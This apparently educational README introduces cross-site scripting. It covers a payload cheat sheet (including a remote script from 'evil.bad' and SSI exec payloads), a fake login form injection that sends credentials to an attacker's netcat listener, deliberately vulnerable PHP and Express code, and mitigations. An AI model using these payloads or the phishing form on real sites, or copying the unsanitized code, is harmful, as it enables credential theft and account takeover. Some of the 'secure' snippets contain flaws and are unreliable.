# XSS---Basics
Basic overview of XSS

What is XSS (Cross Site Scripting)

Cross-site scripting (also known as XSS) is a web security vulnerability that allows an attacker to compromise the interactions that users have with a vulnerable application. It allows an attacker to circumvent the same origin policy, which is designed to segregate different websites from each other. Cross-site scripting vulnerabilities normally allow an attacker to masquerade as a victim user, to carry out any actions that the user is able to perform, and to access any of the user's data. If the victim user has privileged access within the application, then the attacker might be able to gain full control over all of the application's functionality and data. 

Types of XSS

- Reflected XSS         // Where the malicious script comes from the current HTTP request.
- Stored XSS            // Where the malicious script comes from the website's database.
- DOM-based XSS         // Where the vulnerability exists in client-side code rather than server-side code.

What can XSS abused for:


- Impersonate or masquerade as the victim user.
- Carry out any action that the user is able to perform.
- Read any data that the user is able to access.
- Capture the user's login credentials.
- Perform virtual defacement of the web site.
- Inject trojan functionality into the web site.


Testing if any website input boxes / search boxes are vulnerable to XSS

```
Basic Payloads:

<script>alert('XSS')</script>
<body onload=alert(‘something’)>;
<script>destroyWebsite();</script>
<script>alert(document.cookie)</script>
<b onmouseover=alert(‘XSS testing!‘)></b>
<scr<script>ipt>alert('XSS')</scr<script>ipt>
"><script>alert('XSS')</script>
"><script>alert(String.fromCharCode(88,83,83))</script>

SVG Payloads:

<svgonload=alert(1)>
<svg/onload=alert('XSS')>
<svg onload=alert(1)//
<svg/onload=alert(String.fromCharCode(88,83,83))>
<svg id=alert(1) onload=eval(id)>
"><svg/onload=alert(String.fromCharCode(88,83,83))>
"><svg/onload=alert(/XSS/)

IMG Payloads:

<img src=x onerror=alert('XSS');>
<img src=x onerror=alert('XSS')//
<img src=x onerror=alert(String.fromCharCode(88,83,83));>
<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
<img src=x:alert(alt) onerror=eval(src) alt=xss>
"><img src=x onerror=alert('XSS');>
"><img src=x onerror=alert(String.fromCharCode(88,83,83));>

HTML Payloads:

<body onload=alert(/XSS/.source)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<video/poster/onerror=alert(1)>
<video><source onerror="javascript:alert(1)">
<video src=_ onloadstart="alert(1)">
<details/open/ontoggle="alert`1`">
<audio src onloadstart=alert(1)>
<marquee onstart=alert(1)>

Remote Download Payloads:

'"/><script src="https://evil.bad/xss.js"></script>
<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"
<A HREF="http://66.102.7.147/">XSS</A
<A HREF="javascript:document.location='http://www.google.com/'">XSS</A

SSI (Server Side Includes) Payload:

<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://xss.rocks/xss.js></SCRIPT>'"--

Obfuscation Payloads:

(alert)(1)
a=alert,a(1)
[1].find(alert)
top[“al”+”ert”](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
top[‘al\145rt’](1)
top[‘al\x65rt’](1)
top[8680439..toString(30)](1)

Common abused tags for XSS

<script>
<body>
<img>
<iframe>
<input>
<link>
<table>
<div>
<object>
<src>

Dangerous HTML element attributes:

These attributes will execute input as JavaScript by default , making it commonly abused in standard xss attacks

- innerHTML
- src
- onLoad
- onClick
```

Unsecure PHP Vulnerable Code Example 1

The below code is a simple text box that accepts user input and outputs it back to HTML so that the user can see the result

The "text" parameter accepts user-supplied input and stores it in a variable called $text. The variable $text is not being sanitized before it is being passed to HTML as output   
```
<center><h1><font color="red">PHP XSS Test</font></h1>
<hr>
<form method="post">
  <textarea name="text" placeholder="Place Text"></textarea></br>
  <input type="submit" name="bouton" value="Enter" />
</form>

<?php
if(isset($_POST["bouton"])){
  $text = $_POST["text"];         //The "text" parameter is not being sanitized
  echo "<strong>Data:</strong>  ".$text;
}


 ?>
</center>

```
Unsecure PHP XSS Code Example 2

The below code snippet is vulnerable to XSS because the "name" parameter receives user-supplied input that is not being validated before it gets passed to HTML for output
```

<?php

if (!isset($_GET['name'])) 

{
  echo "<h1>Hi! What's your name?</h1>";
  echo "<form action='' method='GET'>";
  echo "<input type='text' name='name'>";
  echo "</form>";

} else {
  header("X-XSS-Protection: 0");
  
  $name = $_GET['name'];  // No user input sanitization
  echo "<h1>Hi $name!</h1>";
}

```

Secure PHP XSS Code Example

Below we added the htmlspecialchars() function infront of the "name" parameter to convert special characters such as <>'"& to HTML entities

This allows HTML to output the user-supplied input as text instead of executing any script tags such as <script>--Malicious_String</script>

We also enforce the HTML Pattern attribute to add regular expression validation by disallowing specific characters such as <>|&'"
```
<?php

if (!isset($_GET['name']))  // Accept user input 
{

  echo "<h1>Hi. What is your name?</h1>";
  echo "<form action='' method='GET'>";   // Create text box to accept user input from a GET request
  echo "<input type='text' name='name'> pattern=[^<>|&'"\x22]+";     //HTML validation - Disallowing the following characters: <>|&'"
  echo "</form>";



} else {
  $name = htmlspecialchars($_GET['name']); // Function to sanatize HTML user input saved to the "name" parameter - Outputs user input as text
  echo "<h1>Hi $name!";
}

```
PHP Functions to secure against XSS

htmlentities() - Function convert all applicable characters to HTML entities

htmlspecialchars() - Function convert the special characters to HTML entities

htmlentities():

Below is a code example of how the htmlentities() function can be used to convert special characters to HTML entities to avoid XSS code execution
```
<?php 
  
// String convertable to htmlentities  
$str = '<a href="https://www.test.org">Test</a>'; 
  
// It will convert htmlentities and print them 
echo htmlentities( $str ); 
?> 
```
Output
```
&lt;a href=&quot;https://www.test.org&quot;&gt;Test&lt;/a&gt;
```
htmlspecialchars():

Below is a code example of how the htmlspecialchars() function can be used to convert special characters to HTML entities to avoid XSS code execution
```
<?php 
  
// Example of htmlspecialchars() function 
  
// String to be converted 
$str = '"test.org" Go to Test'; 
  
// Converts double and single quotes 
echo htmlspecialchars($str, ENT_QUOTES);  
?> 
```
Output
```
&quot;test.org&quot; Go to Test
```

Basic PHP XSS HTML Injection Example

Below code snippet can be used to perform a HTML injection attack to redirect the user to a custom login page. When the user submits his/her credentials , a request will be sent to the attacker's listener to capture the credentials in cear-text

```
h3>Please login to proceed</h3> <form action=http://10.10.10.10:8080>Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br><input type="submit" value="Logon"></br>

// Inject the above command inside a vulnerable input field / box

Attacker: nc -lvnp 8080 // To capture credentials

```

JavaScript Vulnerable Code Example 

The below code is a example of vulnerable code in JS. The XSS are possible becuase the $user variable accepts user-supplied input and passes it as output in HTML without any form of validation
```
const express = require('express')
const app = express()
const port = 3000

app.get('/', (req, res) => res.send('Hello World!'))


app.listen(port, () => console.log(`App listening on port ${port}!`))


const Vulnerability = (req, res) => {
    var user = req.params.user;
    var respond = `
        <h1>Hi, ${user}</h1>   // The Vulnerability
    `
    res.send(respond);
}


const Vulnerability2 = (req, res) => {
    var {user} = req.params;
    var respond = `
        <script> var x = "${user}" </script>   // The vulnerability
    `
    res.send(respond);
}


app.get('/vuln', Vulnerability);
app.get('/vuln2', Vulnerability2);

```
JavaScript Secure Code Example

```
const express = require('express')
const app = express()
const port = 3000

app.get('/', (req, res) => res.send('Hello World!'))

app.get('/noVuln1', NoVulnerability1);
app.get('/noVuln2', NoVulnerability2);

app.listen(port, () => console.log(`Example app listening on port ${port}!`))


const NoVulnerability1 = (req, res) => {
    var user = db.getCurrentUser();
    res.json({
        name: user.name,
        email: user.email
    });
}

const NoVulnerability2 = (req, res) => {
    var accept = req.params.accept ? true : false;
    if(accept){
        res.send('Thank you for accepting');
    }else{
        res.send('Why you did not accept it');
    }
}


```
JavaScript Code Example - Blacklist Specific Characters

The below code will escape specific characters and convert them to HTML entities to help validate user-supplied input against opportunistic threats
```
String.prototype.escape = function() {
    var tagsToReplace = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;'
    };
    return this.replace(/[&<>]/g, function(tag) {
        return tagsToReplace[tag] || tag;
    });
};
```

JavaScript Code Example - Blacklist specific characters in a "Username" name field on a logon page

Used to limit the attack surface against SQli & XSS attacks

It can be enforce in the following two functions:

keypress() - When the end-user types the denied character on his/her keybord 

onpaste() - When the end-user pastes the denied character instead of typing it 

It is best to implement & enforce both functions as the attacker might use either one to bypass validation controls

```
var iChars = "!@#$%^&*()+=-[]\\\';,./{}|\":<>?";

for (var i = 0; i < document.formname.fieldname.value.length; i++) {
    if (iChars.indexOf(document.formname.fieldname.value.charAt(i)) != -1) {
        alert ("Your username has special characters. \nThese are not allowed.\n Please remove them and try again.");
        return false;
    }
}
```

JavaScript Regex Example - Validating a Secure Password on a registration form 

Password must contain 1 small letter , 1 capitalized letter , 1 special character & must be between 12-20 characters
```
"((?=.*\\d)(?=.*[a-z])(?=.*[A-Z])(?=.*[@#$%]).{12,20})"
```

General Tips to Avoid XSS:

- Follow a well-developed SSDLC to help ensure that code gets developed according to secuirty guidelines
- Use SAST / DAST & IAST tools to help identify possible code-centric security vulnerabilities
- Make use of modern JS frameworks that are well updated & maintained
- Understand how the web application works as well as how the code-flows after it accepts user-supplied input 
- Follow the variables that stores user-supplied input and ensure it gets escaped , sanitized & does not get passed to dangerous code fucntions() such as eval() that could result in code execution via a child_process
- Utilize JS libraries such as Yup / validator.js to help sanitize code 
- Block the following characters on all search boxes / contact-us fields on your website via HTML validation or JavaScript validation !@#$%^&*()+=-[]\\\';,./{}|\":<>?
- Enforce HTML Entity Encoding
- Enforce HTML constraint validation
- Enforce URL Encoding
- Utilize Strict Structural Validation for CSS
- Implement & Enforce HTML user validation via attributes such as pattern or by utilizng HTML Sanitizer 
- Consider Canonicalize user-supplied input
- Whitelist backend URL'S and make use of HTTPS for all backend systems
- Make use of the HTTPOnly Cookie Flag 
- Enforce a strict CSP policy to only allow whitelist domains from where Javascript can be sourced from 
- Implement WAF as a safety net to filter and block the majority of web application attacks
- Implement RASP to monitor code-flow and to detected code-flow violations that could result in malicious behaviour
- Perform red team simulations on your web application to help obtain external visibility and to test the effectiveness of your proactive security controls 
- Consider a bug bountry program for your critical web applications to help obtain external security validation and to reinforce your overall security posture 
